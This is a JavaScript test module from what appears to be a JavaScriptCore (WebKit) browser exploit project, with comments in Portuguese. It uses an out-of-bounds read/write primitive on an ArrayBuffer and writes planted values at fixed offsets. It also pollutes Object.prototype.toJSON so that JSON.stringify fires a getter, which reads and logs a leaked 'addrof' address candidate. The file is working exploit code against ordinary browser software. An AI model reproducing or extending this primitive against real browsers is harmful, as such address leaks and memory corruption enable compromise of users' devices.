// js/script3/testAddrofCandidateRead.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Variável global para o getter comunicar (apenas para este teste)
let getter_read_candidate = null;

class CheckpointObjectForAddrof {
    constructor(id) {
        this.id = `AddrOfCheck-${id}`;
        this.prop_for_getter = null;
    }
}

function toJSON_AddrofCandidateGetter() {
    const FNAME_GETTER = "toJSON_AddrofCandidateGetter";
    logS3(`    >>>> [${FNAME_GETTER} ACIONADO!] <<<<`, "vuln", FNAME_GETTER);
    try {
        // O valor em 0x68 é o que se torna o candidato no log anterior
        // O QWORD lido de 0x68 terá:
        //   LOW = oob_buffer[0x68 ... 0x6b]
        //   HIGH = oob_buffer[0x6c ... 0x6f]
        getter_read_candidate = oob_read_absolute(0x68, 8);
        logS3(`      [${FNAME_GETTER}] Leitura de oob_buffer[0x68] (8 bytes): ${getter_read_candidate.toString(true)}`, "leak", FNAME_GETTER);

    } catch (e) {
        logS3(`      [${FNAME_GETTER}] ERRO ao ler candidato de 0x68: ${e.message}`, "error", FNAME_GETTER);
        getter_read_candidate = null;
    }
    return { getter_executed: true };
}


export async function executeAddrofCandidateReadValidation() {
    const FNAME_TEST = "executeAddrofCandidateReadValidation_v20";
    logS3(`--- Iniciando ${FNAME_TEST}: Validar Leitura de Candidato Addrof ---`, "test", FNAME_TEST);
    document.title = `Validate AddrOfCand Read`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }

    const val_low_planted_at_6c = 0x190A190A;
    const val_high_planted_at_70 = 0x0000BEEF; // Alterado para ser diferente de zero
    const qword_to_plant_at_6c = new AdvancedInt64(val_low_planted_at_6c, val_high_planted_at_70);

    const offset_68 = 0x68;
    const offset_6c = 0x6c;
    const offset_70_trigger = 0x70; // Este é o HIGH do qword_to_plant_at_6c E o trigger

    // Limpar a área
    logS3("Limpando área de teste (0x68 - 0x73)...", "info", FNAME_TEST);
    oob_write_absolute(offset_68, AdvancedInt64.Zero, 8); // Limpa 0x68 e 0x6c
    oob_write_absolute(offset_70_trigger, 0x0, 4); // Limpa 0x70 (trigger)
    await PAUSE_S3(50);

    // Verificar limpeza
    let val_at_68_after_clear = oob_read_absolute(offset_68, 8);
    logS3(`  Valor em oob_buffer[${toHex(offset_68)}] APÓS LIMPEZA: ${val_at_68_after_clear.toString(true)}`, "info", FNAME_TEST);


    logS3(`Plantando ${qword_to_plant_at_6c.toString(true)} em oob_buffer[${toHex(offset_6c)}]`, "info", FNAME_TEST);
    oob_write_absolute(offset_6c, qword_to_plant_at_6c, 8);
    // Isso escreve LOW(qword_to_plant_at_6c) em 0x6c e HIGH(qword_to_plant_at_6c) em 0x70.

    // Ler o que está em 0x68 e 0x6c antes do trigger para referência
    let val_at_68_before_trigger = oob_read_absolute(offset_68, 8);
    logS3(`  Valor em oob_buffer[${toHex(offset_68)}] ANTES do trigger: ${val_at_68_before_trigger.toString(true)}`, "info", FNAME_TEST);
    // Esperamos que LOW seja 0 (de offset_68) e HIGH seja val_low_planted_at_6c (de offset_6c)

    getter_read_candidate = null; // Resetar
    let checkpoint_obj = new CheckpointObjectForAddrof(0);
    let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutionApplied = false;

    try {
        Object.defineProperty(Object.prototype, 'toJSON', {
            value: toJSON_AddrofCandidateGetter,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`Escrevendo trigger OOB em oob_buffer[${toHex(offset_70_trigger)}] (que é o HIGH de 0x6c)...`, "warn", FNAME_TEST);
        // A escrita em 0x70 já foi feita pelo oob_write_absolute(offset_6c, qword_to_plant_at_6c, 8);
        // Se precisarmos de um valor diferente para o trigger, podemos sobrescrever apenas os 4 bytes em 0x70
        // oob_write_absolute(offset_70_trigger, 0xTRIGGERVAL, 4);
        // Por enquanto, o HIGH de qword_to_plant_at_6c (0x0000BEEF) atuará como o "trigger"
        // Apenas para ter certeza que o getter é chamado, vamos fazer o JSON.stringify
        logS3("Chamando JSON.stringify para acionar getter...", "info", FNAME_TEST);
        JSON.stringify(checkpoint_obj);

    } catch (e) {
        logS3(`Erro durante o acionamento do getter: ${e.message}`, "error", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
            else delete Object.prototype.toJSON;
        }
    }

    if (getter_read_candidate) {
        logS3(`Candidato a AddrOf lido PELO GETTER de oob_buffer[0x68]: ${getter_read_candidate.toString(true)}`, "leak", FNAME_TEST);
        logS3(`  Parte BAIXA esperada (de oob_buffer[0x68]): ${toHex(0x0)} (pois limpamos)`, "info", FNAME_TEST);
        logS3(`  Parte ALTA esperada (de oob_buffer[0x6c]): ${toHex(val_low_planted_at_6c)}`, "info", FNAME_TEST);

        if (getter_read_candidate.low() === 0x0 && getter_read_candidate.high() === val_low_planted_at_6c) {
            logS3("  LEITURA DO CANDIDATO NO GETTER É CONSISTENTE!", "good", FNAME_TEST);
        } else {
            logS3("  LEITURA DO CANDIDATO NO GETTER É INCONSISTENTE!", "error", FNAME_TEST);
        }
    } else {
        logS3("Getter não foi acionado ou não leu o candidato.", "warn", FNAME_TEST);
    }

    // Limpeza final
    clearOOBEnvironment();
    logS3(`--- ${FNAME_TEST} Concluído ---`, "test", FNAME_TEST);
}
